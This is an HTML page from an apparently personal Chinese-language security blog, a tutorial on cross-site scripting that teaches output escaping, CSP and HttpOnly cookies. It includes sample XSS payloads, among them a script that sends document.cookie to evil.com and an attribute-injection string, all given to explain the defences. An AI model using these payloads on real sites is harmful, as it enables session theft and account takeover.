@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS — ChenSchenG</title>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⚡</text></svg>">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/style.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+</head>
+<body>
+  <nav id="nav">
+    <div class="nav-logo"><a href="/">ChenSchenG</a></div>
+    <div class="nav-links-wrapper">
+      <ul class="nav-links">
+        <li><a href="/">Home</a></li>
+        <li><a href="/#graph">Graph</a></li>
+        <li><a href="/about.html">About</a></li>
+      </ul>
+    </div>
+    <button class="hamburger" id="hamburger" aria-label="Menu"><span class="hamburger-inner"></span></button>
+  </nav>
+  <div class="mobile-menu-overlay" id="mobile-overlay"></div>
+  <aside class="mobile-menu" id="mobile-menu">
+    <ul>
+      <li><a href="/">Home</a></li>
+      <li><a href="/#graph">Graph</a></li>
+      <li><a href="/about.html">About</a></li>
+    </ul>
+  </aside>
+
+  <main class="article-page">
+    <!-- Main content column -->
+    <div class="article-main">
+      <article>
+        <header class="article-header">
+          <div class="article-breadcrumb">
+            <a href="/">Home</a>
+            <span class="separator">/</span>
+            <span>Security</span>
+          </div>
+          <h1>XSS</h1>
+          <div class="article-meta">
+            <span><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="18" rx="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>Posted 2026-04-09</span>
+            <span><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg>Security</span>
+            <span><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>21 min read</span>
+          </div>
+          <div class="article-tags">
+  <span class="tag">密码学与安全</span>
+  <span class="tag">概念</span>
+  <span class="tag">XSS</span>
+  <span class="tag">跨站脚本</span>
+  <span class="tag">攻击手法</span>
+  <span class="tag">Cookie窃取</span>
+  <span class="tag">CSP</span>
+  <span class="tag">HttpOnly</span>
+</div>
+
+        </header>
+
+        <div class="article-body">
+          <h1>XSS（跨站脚本攻击）</h1>
+<blockquote>
+<p><strong>一句话本质</strong><br>XSS 是用户输入被浏览器当作代码执行，靠输出转义+CSP+HttpOnly 三层纵深防御。</p>
+</blockquote>
+<h2>第一幕：问题感知</h2>
+<p>你登录了银行网站，页面右上角显示&quot;欢迎，张三&quot;。你查了余额，转了笔账，关掉浏览器，一切正常。</p>
+<p>第二天，你发现账户里少了五万块。</p>
+<p>银行日志显示：昨晚 11 点，有人用<strong>你的身份</strong>发起了一笔转账。IP 地址不是你的，但登录凭证——那串证明&quot;我是张三&quot;的 Cookie——完全正确。</p>
+<p>你没有把密码告诉任何人。Cookie 存在浏览器里，别的网站读不到。那这串 Cookie 是怎么泄露的？</p>
+<p>回忆一下昨天的操作：你在银行网站的&quot;留言板&quot;看了一条留言，内容看起来很普通。但你不知道的是，那条留言里藏着一段代码。浏览器打开留言页时，把那段代码<strong>当成了网页自身的程序来执行</strong>。</p>
+<p>这就奇怪了——留言板应该只显示文字，为什么浏览器会执行里面的代码？</p>
+<p>你大概会想：那就把用户输入当纯文字处理，不让它变成代码。但问题是，网页本身就是由文字和代码混在一起写成的。浏览器怎么区分&quot;这段是网页作者写的代码&quot;和&quot;这段是用户输入的文字&quot;？</p>
+<p>生活中有没有类似的困境：一份文件里既有&quot;指令&quot;又有&quot;内容&quot;，有人在内容里混入指令，执行者分不清？</p>
+<p><strong>用户输入混成了代码？</strong></p>
+<h2>第二幕：引导式构建</h2>
+<p>先看看网页到底长什么样。浏览器收到的是一份 HTML 文档，里面文字和指令混写：</p>
+<pre><code>&lt;p&gt;用户留言：你好世界&lt;/p&gt;
+</code></pre>
+<p><code>&lt;p&gt;</code> 和 <code>&lt;/p&gt;</code> 是指令（标签），告诉浏览器&quot;这是一个段落&quot;；中间的&quot;用户留言：你好世界&quot;是内容。浏览器靠<strong>尖括号 <code>&lt;&gt;</code></strong> 来区分指令和内容。</p>
+<p>现在，留言板的工作方式是：服务器把用户输入的文字，直接拼接进 HTML 模板里：</p>
+<pre><code>&lt;p&gt;用户留言：{用户输入的内容}&lt;/p&gt;
+</code></pre>
+<p>如果用户输入&quot;你好世界&quot;，生成的 HTML 是 <code>&lt;p&gt;用户留言：你好世界&lt;/p&gt;</code>，浏览器老老实实显示文字，没问题。</p>
+<p>但如果用户输入的是这个呢？</p>
+<pre><code>&lt;script&gt;alert(&#39;嘿嘿&#39;)&lt;/script&gt;
+</code></pre>
+<p>拼接后的 HTML 变成：</p>
+<pre><code>&lt;p&gt;用户留言：&lt;script&gt;alert(&#39;嘿嘿&#39;)&lt;/script&gt;&lt;/p&gt;
+</code></pre>
+<p>浏览器看到 <code>&lt;script&gt;</code>——这是指令！于是它<strong>执行</strong>了里面的代码。一个弹窗跳出来。</p>
+<p>这就是 <strong>XSS（Cross-Site Scripting，跨站脚本攻击）</strong> 的核心：攻击者的输入里包含尖括号和脚本标签，浏览器无法区分&quot;这是网页原有的指令&quot;还是&quot;这是用户混进来的假指令&quot;，于是照单全收。</p>
+<blockquote>
+<p><strong>想一想</strong><br>如果你是浏览器，你收到一段 HTML，里面有 <code>&lt;script&gt;...&lt;/script&gt;</code>，你有没有办法判断这段脚本是网站开发者写的，还是某个用户注入的？</p>
+</blockquote>
+<p>答案是：<strong>没有</strong>。浏览器只看最终的 HTML 文档，它不知道哪部分来自模板、哪部分来自用户输入。到它手里时，一切都已经混在一起了。</p>
+<hr>
+<p>弹窗只是演示。攻击者真正想做的，是偷你的 <strong>Cookie</strong>。</p>
+<p>Cookie 是浏览器替你保管的一小段文字，里面存着你的登录凭证。每次你访问银行网站，浏览器自动把 Cookie 附上，服务器看到 Cookie 就知道&quot;这是张三&quot;。</p>
+<p>在网页的脚本里，读 Cookie 只需要一行代码：<code>document.cookie</code>。所以攻击者注入的不是弹窗，而是：</p>
+<pre><code class="language-javascript">&lt;script&gt;
+  new Image().src = &quot;https://evil.com/steal?c=&quot; + document.cookie;
+&lt;/script&gt;
+</code></pre>
+<p>这段代码做了什么？它创建了一个图片请求，把你的 Cookie 拼进 URL 里，发送到攻击者的服务器。浏览器以为在加载图片，实际上你的登录凭证已经被偷走了。攻击者拿到 Cookie，粘贴到自己的浏览器里，就能以&quot;张三&quot;的身份登录银行。</p>
+<blockquote>
+<p><strong>想一想</strong><br>为什么用&quot;加载图片&quot;的方式发送数据？如果攻击者直接用 <code>fetch(&quot;https://evil.com/...&quot;)</code> 发请求，会有什么不同吗？（提示：浏览器对跨域请求有限制，但加载图片是不受限的——任何网页都可以显示任何地址的图片。这是一个巧妙的绕过。）</p>
+</blockquote>
+<hr>
+<p>现在问题清楚了：用户输入混进了 HTML，变成了代码。怎么防？</p>
+<p>最直觉的想法：<strong>既然问题出在尖括号，那就不让尖括号出现。</strong> 把用户输入里的 <code>&lt;</code> 替换成 <code>&amp;lt;</code>，把 <code>&gt;</code> 替换成 <code>&amp;gt;</code>。</p>
+<p><code>&amp;lt;</code> 是 HTML 的<strong>转义序列（Escape Sequence）</strong>——浏览器看到它，会显示一个字面的 <code>&lt;</code> 符号，但<strong>不会把它当成标签的开头</strong>。</p>
+<p>替换之后，攻击者的输入变成了：</p>
+<pre><code>&lt;p&gt;用户留言：&amp;lt;script&amp;gt;alert(&#39;嘿嘿&#39;)&amp;lt;/script&amp;gt;&lt;/p&gt;
+</code></pre>
+<p>浏览器显示的是纯文字 <code>&lt;script&gt;alert(&#39;嘿嘿&#39;)&lt;/script&gt;</code>，不会执行。指令和内容的边界被守住了。</p>
+<p>这个方法叫做<strong>输出转义（Output Encoding / Escaping）</strong>——不是在用户输入时过滤，而是在<strong>输出到 HTML 时</strong>把危险字符转成无害的转义序列。</p>
+<blockquote>
+<p><strong>想一想</strong><br>为什么强调&quot;输出时&quot;转义，而不是&quot;输入时&quot;过滤掉尖括号？如果用户确实想在留言里讨论 HTML 代码（比如在技术论坛里贴代码片段），输入时过滤会造成什么问题？</p>
+</blockquote>
+<p>输入时过滤会<strong>破坏用户的合法内容</strong>。&quot;输出时转义&quot;则两全其美：数据库里存原始输入，只在渲染成 HTML 的那一刻做转义。</p>
+<hr>
+<p>问题解决了？没有。</p>
+<p>输出转义能防住&quot;用户输入被拼进 HTML 标签之间&quot;的情况。但网页不只有标签——还有<strong>属性</strong>。</p>
+<p>比如一个搜索框，搜索词会回显在页面上：</p>
+<pre><code>&lt;input type=&quot;text&quot; value=&quot;{用户输入的搜索词}&quot;&gt;
+</code></pre>
+<p>如果用户输入的是：</p>
+<pre><code>&quot; onfocus=&quot;alert(&#39;嘿嘿&#39;)
+</code></pre>
+<p>拼接后变成：</p>
+<pre><code>&lt;input type=&quot;text&quot; value=&quot;&quot; onfocus=&quot;alert(&#39;嘿嘿&#39;)&quot;&gt;
+</code></pre>
+<p>没有任何 <code>&lt;script&gt;</code> 标签，也没有尖括号。但 <code>onfocus</code> 是一个<strong>事件属性（Event Handler）</strong>——当输入框获得焦点时，浏览器会执行里面的代码。</p>
+<p>攻击者绕过了尖括号转义！因为这次攻击的注入点不在&quot;标签之间&quot;，而在&quot;属性值里面&quot;。在属性值里，危险字符不是 <code>&lt;&gt;</code>，而是<strong>引号 <code>&quot;</code></strong>——它能提前关闭属性值，插入新属性。</p>
+<p>所以输出转义不能只替换尖括号。必须根据<strong>输出的上下文</strong>转义不同的字符：</p>
+<table>
+<thead>
+<tr>
+<th>上下文</th>
+<th>危险字符</th>
+<th>转义方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>HTML 标签之间</td>
+<td><code>&lt; &gt; &amp; &quot;</code></td>
+<td><code>&amp;lt;</code> <code>&amp;gt;</code> <code>&amp;amp;</code> <code>&amp;quot;</code></td>
+</tr>
+<tr>
+<td>HTML 属性值内</td>
+<td><code>&quot; &#39; &amp;</code></td>
+<td><code>&amp;quot;</code> <code>&amp;#x27;</code> <code>&amp;amp;</code></td>
+</tr>
+<tr>
+<td>JavaScript 字符串内</td>
+<td><code>&#39; &quot; \ /</code></td>
+<td><code>\x27</code> <code>\x22</code> <code>\\</code> <code>\/</code></td>
+</tr>
+<tr>
+<td>URL 参数内</td>
+<td>非字母数字</td>
+<td><code>%XX</code> 百分号编码</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p><strong>想一想</strong><br>为什么同一个字符（比如引号 <code>&quot;</code>）在不同上下文里需要不同的转义方式？用一种&quot;万能转义&quot;统一处理所有情况，行不行？</p>
+</blockquote>
+<p>不行。每种上下文有自己的解析规则——HTML 解析器、JS 解析器、URL 解析器各管各的。<code>&amp;quot;</code> 只有 HTML 解析器认识，放进 JavaScript 字符串里就是六个普通字符，毫无防御效果。</p>
+<hr>
+<p>上下文转义解决了输出端的问题。但还有一个根本性的困境：你能保证<strong>每一个</strong>输出点都正确转义了吗？</p>
+<p>一个大型网站可能有成千上万个地方把数据嵌入 HTML。漏掉一个，就是一个 XSS 漏洞。这是一场不对称战争——防御者需要堵住所有洞，攻击者只需要找到一个。</p>
+<p>有没有一种方式，不依赖&quot;每个输出点都做对&quot;，而是从<strong>全局</strong>兜底？</p>
+<p>浏览器其实提供了这样一个机制：<strong>CSP（Content Security Policy，内容安全策略）</strong>。</p>
+<p>CSP 的思路完全不同。它不在输出点做文章，而是让服务器<strong>提前告诉浏览器</strong>：这个页面允许执行哪些脚本，不允许执行哪些。具体方式是服务器在 HTTP 响应头里加一行声明：</p>
+<pre><code>Content-Security-Policy: script-src &#39;self&#39;
+</code></pre>
+<p>这句话的意思是：<strong>只执行来自本站域名的脚本文件</strong>。任何内联脚本（直接写在 HTML 里的 <code>&lt;script&gt;...&lt;/script&gt;</code>）、任何外部域名的脚本，统统拒绝执行。</p>
+<p>攻击者注入的代码几乎都是内联脚本。CSP 开启后，即使 HTML 里出现了注入的 <code>&lt;script&gt;alert(&#39;嘿嘿&#39;)&lt;/script&gt;</code>，浏览器看到它不在允许名单里，直接忽略，不执行。</p>
+<blockquote>
+<p><strong>想一想</strong><br>CSP 是不是万能的？如果攻击者的注入代码不是内联脚本，而是引用了本站自身的一个合法 JS 文件（比如 <code>&lt;script src=&quot;/js/analytics.js&quot;&gt;&lt;/script&gt;</code>），CSP 的 <code>script-src &#39;self&#39;</code> 能拦住吗？</p>
+</blockquote>
+<p>拦不住——因为它确实来自本站域名。这就是为什么更严格的 CSP 用 <strong>nonce（随机数）</strong> 或 <strong>hash</strong> 来精确标记每个合法脚本，而不仅仅靠域名。</p>
+<hr>
+<p>我们现在有了两层防御：输出转义（堵注入点）+ CSP（拦执行端）。但 Cookie 被偷这件事——还有没有更直接的办法？</p>
+<p>回顾一下攻击链：注入脚本 → 脚本读取 <code>document.cookie</code> → 发送到攻击者服务器。</p>
+<p>如果<strong>脚本根本读不到 Cookie</strong> 呢？</p>
+<p>HTTP 协议提供了一个 Cookie 属性：<strong>HttpOnly</strong>。设置了 HttpOnly 的 Cookie，浏览器会正常发送给服务器，但 JavaScript 代码<strong>无法通过 <code>document.cookie</code> 读取它</strong>。</p>
+<pre><code>Set-Cookie: session=abc123; HttpOnly; Secure
+</code></pre>
+<p>这样即使 XSS 攻击成功、脚本跑起来了，它执行 <code>document.cookie</code> 得到的是空的——拿不到会话 Cookie。</p>
+<blockquote>
+<p><strong>想一想</strong><br>HttpOnly 阻止了&quot;偷 Cookie&quot;这条路。但 XSS 注入的脚本还在受害者的浏览器里运行着，它还能做什么坏事？（提示：脚本可以修改页面内容、发起请求……）</p>
+</blockquote>
+<p>脚本仍然可以：篡改页面显示虚假信息、代替用户发起转账请求、记录键盘输入窃取密码。HttpOnly 只断了&quot;偷 Cookie&quot;一条路，不是终极方案。</p>
+<hr>
+<p>最后一个关键区分。到目前为止，我们讨论的都是&quot;攻击者把恶意代码存到服务器上，其他用户访问时触发&quot;——留言板就是这个场景。但 XSS 还有另一种形态。</p>
+<p>假设搜索页面直接把 URL 里的参数回显到页面上：</p>
+<pre><code>https://bank.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<p>服务器没有存储任何东西，但如果它把 <code>q</code> 参数的值直接拼进了 HTML 返回给浏览器，脚本照样执行。</p>
+<p>攻击者只需要把这个精心构造的 URL 发给受害者（通过钓鱼邮件、聊天链接），受害者一点击就中招。</p>
+<p>这就是 XSS 的两大类型：</p>
+<p><strong>存储型 XSS（Stored XSS）</strong>：恶意代码被存到服务器（数据库），每个访问该页面的用户都会触发。留言板、评论区、个人资料页是高危区域。影响面大，一次注入、反复触发。</p>
+<p><strong>反射型 XSS（Reflected XSS）</strong>：恶意代码在 URL 参数里，服务器原样&quot;反射&quot;回页面。需要诱骗受害者点击特定链接。一次一个受害者，但攻击更隐蔽。</p>
+<blockquote>
+<p><strong>想一想</strong><br>从防御角度看，存储型和反射型的防御手段有区别吗？输出转义和 CSP 对这两种类型是否同样有效？</p>
+</blockquote>
+<p>防御手段完全一样——关键都在<strong>输出环节</strong>。不管恶意代码是从数据库读出来的，还是从 URL 参数传进来的，只要输出时正确转义，就不会被执行。CSP 也同样对两者生效。</p>
+<h2>第三幕：完整组装</h2>
+<p><strong>全景图</strong>：</p>
+<pre><code>                        XSS 攻击与防御全景
+                        
+[攻击者] --- 注入恶意脚本 ---&gt; [服务器/URL]
+                                    |
+                        +-----------+-----------+
+                        |                       |
+                  [存储型 XSS]            [反射型 XSS]
+                  恶意代码存入DB           恶意代码在URL参数中
+                        |                       |
+                        +--------- + -----------+
+                                   |
+                                   v
+                         [服务器拼接 HTML]
+                                   |
+              +-------- 防御层 1 --------+
+              |    输出转义 (Escaping)    |
+              |  &lt; -&gt; &amp;lt;  &quot; -&gt; &amp;quot;  |
+              |  按上下文选择转义规则      |
+              +--------------------------+
+                                   |
+                                   v
+                        [HTML 发送到浏览器]
+                                   |
+              +-------- 防御层 2 --------+
+              |    CSP (内容安全策略)     |
+              | script-src &#39;self&#39;/nonce  |
+              |  拒绝未授权的脚本执行      |
+              +--------------------------+
+                                   |
+                          (如果脚本仍执行)
+                                   |
+              +-------- 防御层 3 --------+
+              |    HttpOnly Cookie       |
+              |  JS 无法读取会话 Cookie   |
+              |  阻断 Cookie 窃取链路     |
+              +--------------------------+
+</code></pre>
+<p><strong>端到端示例</strong>：一个留言板网站，用户可以发留言，其他人可以看到。</p>
+<p><strong>攻击过程（无防御时）</strong>：</p>
+<p>第一步，攻击者在留言框输入：</p>
+<pre><code>&lt;script&gt;new Image().src=&quot;https://evil.com/s?c=&quot;+document.cookie&lt;/script&gt;
+</code></pre>
+<p>第二步，服务器存入数据库，原样保存。</p>
+<p>第三步，受害者张三访问留言页。服务器从数据库取出留言，拼接 HTML：</p>
+<pre><code>&lt;div class=&quot;comment&quot;&gt;&lt;script&gt;new Image().src=&quot;https://evil.com/s?c=&quot;+document.cookie&lt;/script&gt;&lt;/div&gt;
+</code></pre>
+<p>第四步，浏览器解析 HTML，遇到 <code>&lt;script&gt;</code> 标签，执行脚本。张三的 Cookie <code>session=abc123</code> 被发送到 <code>evil.com</code>。</p>
+<p>第五步，攻击者用 <code>session=abc123</code> 冒充张三登录。</p>
+<p><strong>防御后</strong>：</p>
+<ul>
+<li><strong>输出转义</strong>：服务器输出时把 <code>&lt;</code> 转成 <code>&amp;lt;</code>。HTML 变成 <code>&amp;lt;script&amp;gt;...&amp;lt;/script&amp;gt;</code>，浏览器显示纯文字，不执行。<strong>攻击在第三步被阻断。</strong></li>
+<li><strong>CSP</strong>：响应头包含 <code>script-src &#39;self&#39;</code>。即使转义漏了，浏览器拒绝执行内联脚本。<strong>攻击在第四步被阻断。</strong></li>
+<li><strong>HttpOnly</strong>：Cookie 设置了 HttpOnly。即使脚本跑起来了，<code>document.cookie</code> 返回空。<strong>攻击在第四步末尾被阻断（Cookie 读不出来）。</strong></li>
+</ul>
+<p>三层防御，任何一层生效，攻击链就断了。</p>
+<h2>第四幕：验证与压力测试</h2>
+<p><strong>反事实 1：如果去掉输出转义？</strong><br>只靠 CSP 和 HttpOnly。CSP 的 <code>script-src &#39;self&#39;</code> 能挡住内联脚本，但如果攻击者找到一个本站的合法脚本文件可以被利用（比如 JSONP 端点），就能绕过 CSP。输出转义是最基础的防线，去掉它等于赌后面的层永远不出错。</p>
+<p><strong>反事实 2：如果去掉 CSP？</strong><br>依赖每个输出点都正确转义。大型项目里漏掉一个输出点的概率不是零——CSP 就是为这种&quot;万一漏了&quot;准备的全局兜底。</p>
+<p><strong>反事实 3：如果去掉 HttpOnly？</strong><br>输出转义 + CSP 双层防护下，脚本大概率不会执行。但防御的哲学是<strong>纵深防御（Defense in Depth）</strong>——每一层都假设其他层可能失败。HttpOnly 是最后一道门。</p>
+<p><strong>边界：XSS 在什么条件下防御失效？</strong></p>
+<ul>
+<li>前端框架直接操作 DOM（如 <code>innerHTML = userInput</code>），绕过了模板引擎的自动转义</li>
+<li>CSP 配置过于宽松（如 <code>script-src &#39;unsafe-inline&#39;</code>），等于没开</li>
+<li><strong>DOM 型 XSS（DOM-based XSS）</strong>：恶意代码不经过服务器，纯在客户端 JavaScript 里拼接——服务端转义完全看不到它。这是第三种 XSS 类型，防御需要在前端代码里同样做输出转义</li>
+<li>富文本场景（允许用户输入 HTML）下，转义会破坏合法内容，需要用 HTML 净化器（Sanitizer）做白名单过滤</li>
+</ul>
+<p><strong>连接：XSS 和 SQL 注入的关系？</strong><br>完全相同的本质：<strong>输入和指令混在同一个通道里，解析器分不清边界</strong>。SQL 注入是用户输入混进了 SQL 查询语句；XSS 是用户输入混进了 HTML/JS 代码。防御思路也相同——参数化/转义，让&quot;数据永远是数据，指令永远是指令&quot;。</p>
+<p><strong>连接：XSS 和 CSRF 的关系？</strong><br>CSRF 的防御通常靠 CSRF Token——一个隐藏在表单里的随机值，攻击者猜不到。但如果存在 XSS 漏洞，攻击者的脚本在页面内执行，可以直接<strong>读取页面上的 CSRF Token</strong>，然后带着 Token 发起请求。所以 XSS 是 CSRF 防御的<strong>天敌</strong>——有 XSS，CSRF Token 形同虚设。</p>
+<p><strong>终极挑战·空白重建</strong>：</p>
+<p>如果忘掉一切，只记得&quot;用户留言里的代码被浏览器执行了&quot;，能重新发明防御方案吗？</p>
+<pre><code>[用户输入混成了代码]
+    |
+    v
+[为什么？HTML 里指令和内容靠 &lt;&gt; 区分，用户输入含 &lt;&gt;]
+    |
+    v
+[方案1：输出转义 -- 把 &lt; 变成 &amp;lt;，让浏览器显示而非执行]
+    |
+    v
+[新问题：不止 &lt;&gt;，属性值里引号也危险 -- 按上下文转义不同字符]
+    |
+    v
+[新问题：输出点太多，难保全部正确 -- CSP 全局兜底，白名单控制脚本执行]
+    |
+    v
+[最后一道门：即使脚本执行了，Cookie 也拿不到 -- HttpOnly]
+    |
+    v
+[三层纵深防御：输出转义 + CSP + HttpOnly]
+</code></pre>
+<h2>关联笔记</h2>
+<blockquote>
+<p><strong>相关原子概念</strong><br><a href="/knowledge/csrf.html">CSRF</a> · <a href="/knowledge/sql%E6%B3%A8%E5%85%A5.html">SQL注入</a> · <a href="/knowledge/ssrf.html">SSRF</a> · <a href="/knowledge/jwt.html">JWT</a> · <a href="/knowledge/oidc.html">OIDC</a></p>
+</blockquote>
+<p>XSS 和 <a href="/knowledge/sql%E6%B3%A8%E5%85%A5.html">SQL注入</a> 是同一个&quot;注入&quot;本质的不同投影：SQL 注入注入 SQL，XSS 注入 HTML/JS，统一防御原则是在边界上将数据和指令分离。XSS 是 <a href="/knowledge/csrf.html">CSRF</a> 防御的天敌——XSS 可以读取 CSRF Token，使 CSRF 防御失效。<a href="/knowledge/jwt.html">JWT</a> 存在 localStorage 时可被 XSS 窃取。<a href="/knowledge/ssrf.html">SSRF</a> 是注入攻击的第三种投影——注入的是 URL/协议。<a href="/knowledge/oidc.html">OIDC</a> 的身份层安全与 XSS 结合可能导致身份盗用。</p>
+
+        </div>
+      </article>
+
+      <section class="related-notes">
+  <h3>Related Notes</h3>
+  <div class="related-notes-grid">
+    <a href="csrf.html" class="related-note-card">
+      <div class="related-title">CSRF</div>
+      <div class="related-category">Security</div>
+    </a>
+    <a href="sql注入.html" class="related-note-card">
+      <div class="related-title">SQL注入</div>
+      <div class="related-category">Security</div>
+    </a>
+    <a href="ssrf.html" class="related-note-card">
+      <div class="related-title">SSRF</div>
+      <div class="related-category">Security</div>
+    </a>
+    <a href="jwt.html" class="related-note-card">
+      <div class="related-title">JWT</div>
+      <div class="related-category">Security</div>
+    </a>
+    <a href="oidc.html" class="related-note-card">
+      <div class="related-title">OIDC（OpenID Connect）</div>
+      <div class="related-category">Security</div>
+    </a>
+  </div>
+</section>
+
+      <div class="post-nav">
+  <a href="ddos.html">
+    <div class="post-nav-label"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"/></svg> Previous</div>
+    <div class="post-nav-title">DDoS</div>
+  </a>
+  <a href="src.html">
+    <div class="post-nav-label">Next <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"/></svg></div>
+    <div class="post-nav-title">SRC</div>
+  </a>
+</div>
+
+
+      <div style="padding-bottom:40px;">
+        <a href="/" class="back-link">Back to Home</a>
+      </div>
+    </div>
+
+    <!-- TOC sidebar (right) -->
+    <aside class="toc-sidebar" id="toc-sidebar">
+      <div class="toc-title">On This Page</div>
+      <ul class="toc-list" id="toc-list"></ul>
+    </aside>
+  </main>
+
+  <!-- Back to top -->
+  <button class="back-to-top" id="back-to-top" aria-label="Back to top">
+    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="18 15 12 9 6 15"/></svg>
+  </button>
+
+  <footer>
+    <p>Designed &amp; Built by <a href="https://github.com/ChenSchenG">ChenSchenG</a></p>
+  </footer>
+
+  <script src="../js/main.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>
+    hljs.highlightAll();
+
+    // --- Generate TOC from headings ---
+    (function(){
+      var body = document.querySelector(".article-body");
+      var tocList = document.getElementById("toc-list");
+      if(!body || !tocList) return;
+      var headings = body.querySelectorAll("h1, h2, h3");
+      if(headings.length < 2){ document.getElementById("toc-sidebar").style.display="none"; return; }
+      headings.forEach(function(h, i){
+        if(!h.id) h.id = "heading-" + i;
+        var li = document.createElement("li");
+        var tag = h.tagName.toLowerCase();
+        li.className = "toc-" + tag;
+        var a = document.createElement("a");
+        a.href = "#" + h.id;
+        a.textContent = h.textContent;
+        li.appendChild(a);
+        tocList.appendChild(li);
+      });
+
+      // Scroll-spy: highlight active TOC item
+      var tocLinks = tocList.querySelectorAll("a");
+      var observer = new IntersectionObserver(function(entries){
+        entries.forEach(function(entry){
+          if(entry.isIntersecting){
+            tocLinks.forEach(function(l){ l.classList.remove("active"); });
+            var active = tocList.querySelector('a[href="#' + entry.target.id + '"]');
+            if(active) active.classList.add("active");
+          }
+        });
+      }, { rootMargin: "-80px 0px -70% 0px", threshold: 0 });
+      headings.forEach(function(h){ observer.observe(h); });
+    })();
+
+    // --- Code copy buttons ---
+    document.querySelectorAll(".article-body pre").forEach(function(pre){
+      var btn = document.createElement("button");
+      btn.className = "code-copy-btn";
+      btn.textContent = "Copy";
+      btn.addEventListener("click", function(){
+        var code = pre.querySelector("code");
+        navigator.clipboard.writeText(code.textContent).then(function(){
+          btn.textContent = "Copied!"; btn.classList.add("copied");
+          setTimeout(function(){ btn.textContent = "Copy"; btn.classList.remove("copied"); }, 2000);
+        });
+      });
+      pre.appendChild(btn);
+    });
+
+    // --- Back to top ---
+    (function(){
+      var btn = document.getElementById("back-to-top");
+      if(!btn) return;
+      window.addEventListener("scroll", function(){
+        btn.classList.toggle("visible", window.scrollY > 400);
+      });
+      btn.addEventListener("click", function(){
+        window.scrollTo({ top: 0, behavior: "smooth" });
+      });
+    })();
+  </script>
+</body>
+</html>
